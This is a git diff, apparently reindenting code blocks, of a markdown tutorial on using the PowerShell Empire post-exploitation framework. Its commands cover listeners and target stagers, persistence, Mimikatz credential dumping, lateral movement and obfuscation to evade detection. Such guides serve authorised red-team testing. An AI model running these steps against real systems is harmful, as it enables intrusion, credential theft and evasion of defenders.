@@ -15,103 +15,103 @@ PowerShell Empire is a post-exploitation framework that leverages PowerShell scr
 
 ### On Unix-based systems (Linux/macOS):
 1. **Install Dependencies:**
-   ```sh
-   sudo apt-get update
-   sudo apt-get install powershell
-   sudo apt-get install git
-   sudo apt-get install python3-pip
-   ```
+```sh
+sudo apt-get update
+sudo apt-get install powershell
+sudo apt-get install git
+sudo apt-get install python3-pip
+```
 
 2. **Clone the Empire Repository:**
-   ```sh
-   git clone https://github.com/BC-SECURITY/Empire.git
-   cd Empire
-   ```
+```sh
+git clone https://github.com/BC-SECURITY/Empire.git
+cd Empire
+```
 
 3. **Install Empire:**
-   ```sh
-   sudo ./setup/install.sh
-   ```
+```sh
+sudo ./setup/install.sh
+```
 
 ### On Windows:
 1. **Download and Install PowerShell:**
    - PowerShell Empire requires PowerShell to be installed. Download it from the [Microsoft PowerShell GitHub](https://github.com/PowerShell/PowerShell).
 
 2. **Clone the Empire Repository:**
-   ```sh
-   git clone https://github.com/BC-SECURITY/Empire.git
-   cd Empire
-   ```
+```sh
+git clone https://github.com/BC-SECURITY/Empire.git
+cd Empire
+```
 
 3. **Run the Setup Script:**
-   ```sh
-   .\setup\install.ps1
-   ```
+```sh
+.\setup\install.ps1
+```
 
 ## Basic Usage
 PowerShell Empire is run from the command line interface (CLI). Here are some common commands and usage examples:
 
 ### Starting the Empire Server
 1. **Run Empire:**
-   ```sh
-   sudo ./empire
-   ```
+```sh
+sudo ./empire
+```
 
 2. **Launch the Listener:**
    - In the Empire console, use:
-   ```sh
-   listeners
-   ```
+```sh
+listeners
+```
    - Choose the listener type (e.g., `http`) and start it with:
-   ```sh
-   uselistener http
-   execute
-   ```
+```sh
+uselistener http
+execute
+```
 
 ### Generating an Agent
 1. **Generate a PowerShell Stager:**
-   ```sh
-   usestager windows/launcher_bat
-   set Listener http
-   execute
-   ```
+```sh
+usestager windows/launcher_bat
+set Listener http
+execute
+```
    - Copy the generated PowerShell script to use on the target machine.
 
 ### Interacting with Agents
 1. **List Active Agents:**
-   ```sh
-   agents
-   ```
+```sh
+agents
+```
 
 2. **Interact with an Agent:**
-   ```sh
-   interact <agent_name>
-   ```
+```sh
+interact <agent_name>
+```
 
 3. **Run a Module on an Agent:**
-   ```sh
-   usemodule <module_name>
-   ```
+```sh
+usemodule <module_name>
+```
    - Example:
-   ```sh
-   usemodule privesc/powerup/allchecks
-   execute
-   ```
+```sh
+usemodule privesc/powerup/allchecks
+execute
+```
 
 ### Persistence Techniques
 PowerShell Empire includes several modules to establish persistence on a compromised host:
 
 - **Registry Persistence:**
-  ```sh
-  usemodule persistence/elevated/registry
-  execute
-  ```
+```sh
+usemodule persistence/elevated/registry
+execute
+```
 
 - **Scheduled Task Persistence:**
-  ```sh
-  usemodule persistence/elevated/schtasks
-  execute
-  ```
+```sh
+usemodule persistence/elevated/schtasks
+execute
+```
 
 ## Advanced Features
 PowerShell Empire offers several advanced features for more specific use cases:
@@ -119,27 +119,27 @@ PowerShell Empire offers several advanced features for more specific use cases:
 ### Credential Harvesting
 - **Mimikatz Integration:**
   - Use the Mimikatz module to extract credentials from memory:
-  ```sh
-  usemodule credentials/mimikatz/lsadump
-  execute
-  ```
+```sh
+usemodule credentials/mimikatz/lsadump
+execute
+```
 
 ### Lateral Movement
 - **Pass-the-Hash:**
   - Use the `pth` module to perform pass-the-hash attacks:
-  ```sh
-  usemodule lateral_movement/invoke_wmi
-  execute
-  ```
+```sh
+usemodule lateral_movement/invoke_wmi
+execute
+```
 
 ### Bypassing Detection
 - **Obfuscate PowerShell Scripts:**
   - Use built-in obfuscation techniques to evade detection:
-  ```sh
-  usestager windows/launcher_bat
-  set ObfuscateCommand True
-  execute
-  ```
+```sh
+usestager windows/launcher_bat
+set ObfuscateCommand True
+execute
+```
 
 ## Tools for Post-Exploitation Using PowerShell Empire
 
